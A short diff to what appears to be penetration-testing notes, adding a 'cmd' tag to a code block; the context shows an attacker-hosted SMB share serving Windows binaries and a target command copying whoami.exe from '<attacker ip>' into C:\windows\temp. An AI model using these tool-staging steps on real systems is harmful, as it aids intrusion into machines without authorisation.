@@ -362,7 +362,7 @@ python2 smbserver.py public /usr/share/windows-resources/binaries/
 
 target
 
-```
+```cmd
 copy \\<attacker ip>\whoami.exe C:\windows\temp
 ```
 
